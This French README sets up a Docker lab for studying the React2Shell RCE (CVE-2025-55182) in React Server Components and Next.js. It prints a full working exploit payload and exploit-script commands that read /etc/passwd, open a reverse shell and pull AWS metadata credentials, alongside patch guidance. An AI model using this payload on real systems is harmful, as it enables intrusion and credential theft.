# Laboratoire de Sécurité CVE-2025-55182 (React2Shell)

## 🎯 Aperçu

Ce laboratoire fournit un environnement entièrement reproductible pour étudier la **CVE-2025-55182**, une vulnérabilité critique d'exécution de code à distance (RCE) pré-authentification dans les composants serveur React (RSC), communément appelée **"React2Shell"**.

| Attribut | Valeur |
|-----------|-------|
| **ID CVE** | CVE-2025-55182 |
| **Alias** | React2Shell |
| **Score CVSS** | 10.0 (Critique) |
| **Type** | Désérialisation non sécurisée / Défaut de logique |
| **Impact** | Exécution de code à distance non authentifiée |
| **Date de divulgation** | 3 décembre 2025 |
| **Découvreur** | Lachlan Davidson |
| **Logiciels affectés** | React 19.x, Next.js 15.x/16.x avec App Router |

---

## 📁 Structure du Laboratoire

```
react2shell-lab/
├── README.md                    # Ce fichier - Manuel de reproduction
├── docker-compose.yml           # Orchestration des conteneurs
├── vulnerable-app/              # Application Next.js vulnérable
│   ├── Dockerfile
│   ├── package.json
│   ├── next.config.mjs
│   └── app/
│       ├── layout.js
│       └── page.js
├── exploit/                     # Outils d'exploitation
│   ├── exploit.py               # Script d'exploitation RCE en Python
│   ├── payload_generator.py     # Utilitaire de construction de payload
│   ├── reverse_shell.py         # Payload de reverse shell
│   └── scanner.py               # Scanner de vulnérabilité
├── mitigation/                  # Version corrigée pour comparaison
│   ├── Dockerfile.patched
│   └── package.json.patched
├── docs/                        # Documentation
│   └── images/                  # Captures d'écran et diagrammes
└── report.md                    # Rapport d'analyse technique
```

---

## 🚀 Démarrage Rapide

### Prérequis

- Docker & Docker Compose
- Python 3.8+
- curl ou httpie
- Netcat (optionnel, pour les reverse shells)

### Démarrage Rapide (Recommandé)

Le script `lab.sh` facilite la gestion du laboratoire.

```bash
# Rendre le script exécutable
chmod +x lab.sh

# Démarrer le laboratoire
./lab.sh start
```

### Méthodes Alternatives

#### Option A : Utilisation de Docker Compose
```bash
docker-compose up --build -d

# Vérifier que l'application fonctionne
curl -s http://localhost:3000 | head -5
```

#### Option B : Démarrage manuel
```bash
cd vulnerable-app
npm install
npm run build
npm run start

# Vérifier que l'application fonctionne
curl -s http://localhost:3000 | head -5
```

### Étape 2 : Lancer l'Exploit

```bash
# RCE Basique - Exécuter la commande 'id'
python3 exploit/exploit.py http://localhost:3000 "id"

# Lire des fichiers sensibles
python3 exploit/exploit.py http://localhost:3000 "cat /etc/passwd"

# Divulgation des variables d'environnement
python3 exploit/exploit.py http://localhost:3000 "env"
```

### Étape 3 : Observer la Sortie

La sortie de l'exploit montre les résultats de l'exécution de la commande dans le corps de la réponse :

```
[*] Target: http://localhost:3000
[*] Command: id
[+] VULNERABLE! Command output:
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon)...
```

---

## 📋 Manuel de Reproduction Étape par Étape

### Phase 1 : Configuration de l'Environnement

#### 1.1 Démarrer l'Application Vulnérable

```bash
# Option A : Utilisation de Docker Compose (recommandé)
docker-compose up -d

# Option B : Utilisation de l'image pré-construite
docker run --rm -p 127.0.0.1:3000:3000 ghcr.io/l4rm4nd/cve-2025-55182:latest

# Option C : Construction manuelle
cd vulnerable-app
npm install
npm run build
npm run start
```

#### 1.2 Vérifier que l'Application Fonctionne

```bash
# Vérifier si le serveur répond
curl -I http://localhost:3000

# Attendu : HTTP/1.1 200 OK avec les en-têtes Next.js
```

### Phase 2 : Détection de la Vulnérabilité

#### 2.1 Détection Manuelle avec curl

```bash
# Envoyer une requête sonde avec l'en-tête Next-Action
curl -X POST http://localhost:3000 \
  -H "Content-Type: multipart/form-data; boundary=----test" \
  -H "Next-Action: x" \
  -d $'------test\r\nContent-Disposition: form-data; name="0"\r\n\r\ntest\r\n------test--'
```

Si la réponse contient des en-têtes spécifiques RSC (`text/x-component`), le point de terminaison est potentiellement vulnérable.

#### 2.2 Scan Automatisé

```bash
# Utilisation du scanner inclus
python3 exploit/scanner.py -u http://localhost:3000

# Utilisation de Nuclei (si installé)
nuclei -t nuclei-template/CVE-2025-55182.yaml -u http://localhost:3000
```

### Phase 3 : Exploitation

#### 3.1 Preuve de Concept RCE Basique

```bash
# Exécuter le script d'exploitation
python3 exploit/exploit.py http://localhost:3000 "whoami"
```

#### 3.2 Comprendre le Payload

L'exploit fonctionne en envoyant une requête multipart form craftée :

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Next-Action: x

------WebKitFormBoundary
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "process.mainModule.require('child_process').execSync('id');",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundary
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundary
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundary--
```

#### 3.3 Exploitation Avancée

**Reverse Shell :**
```bash
# Terminal 1 : Démarrer l'écouteur
nc -lvnp 4444

# Terminal 2 : Envoyer le payload de reverse shell
python3 exploit/reverse_shell.py http://localhost:3000 VOTRE_IP 4444
```

**Exfiltration de Fichiers :**
```bash
python3 exploit/exploit.py http://localhost:3000 "cat /app/package.json"
```

### Phase 4 : Analyse Post-Exploitation

#### 4.1 Découverte de l'Environnement

```bash
# Obtenir les informations système
python3 exploit/exploit.py http://localhost:3000 "uname -a"

# Lister les processus en cours
python3 exploit/exploit.py http://localhost:3000 "ps aux"

# Configuration réseau
python3 exploit/exploit.py http://localhost:3000 "cat /etc/hosts"
```

#### 4.2 Accès aux Métadonnées Cloud (si applicable)

```bash
# Métadonnées AWS
python3 exploit/exploit.py http://localhost:3000 \
  "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

---

## 🔧 Atténuation et Vérification du Correctif

### Appliquer le Patch

```bash
# Arrêter le conteneur vulnérable
docker-compose down

# Construire la version corrigée
docker-compose -f docker-compose.patched.yml up -d

# Vérifier le correctif
python3 exploit/exploit.py http://localhost:3000 "id"
# Attendu : Erreur de connexion ou réponse non exploitable
```

### Versions Corrigées

| Paquet | Vulnérable | Corrigé |
|---------|------------|---------|
| react | 19.0.0 - 19.2.0 | 19.0.1, 19.1.2, 19.2.1+ |
| react-dom | 19.0.0 - 19.2.0 | 19.0.1, 19.1.2, 19.2.1+ |
| next | 15.0.0 - 16.0.6 | 15.2.4, 16.0.7+ |
| react-server-dom-webpack | 19.0.0 - 19.2.0 | 19.0.1+ |

---

## ⚠️ Avertissement

**Ce laboratoire est UNIQUEMENT à des fins ÉDUCATIVES et de TESTS DE SÉCURITÉ AUTORISÉS.**

En utilisant ce laboratoire, vous acceptez de :
- L'utiliser uniquement dans des environnements contrôlés et isolés
- Ne jamais le déployer contre des systèmes sans autorisation explicite
- L'accès non autorisé à des systèmes informatiques est illégal
- Les auteurs déclinent TOUTE RESPONSABILITÉ en cas de mauvaise utilisation

---

## 📚 Références

- [Avis de sécurité React](https://react.dev/security)
- [Blog Wiz : Plongée dans React2Shell](https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive)
- [Rapport de renseignement sur les menaces AWS](https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/)
- [Renseignement sur les menaces Google](https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182)
- [Entrée NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [PoC Original par Lachlan Davidson](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [react2shell.com](https://react2shell.com/)

---

## 📝 Licence

Ce projet est publié sous licence MIT à des fins éducatives.
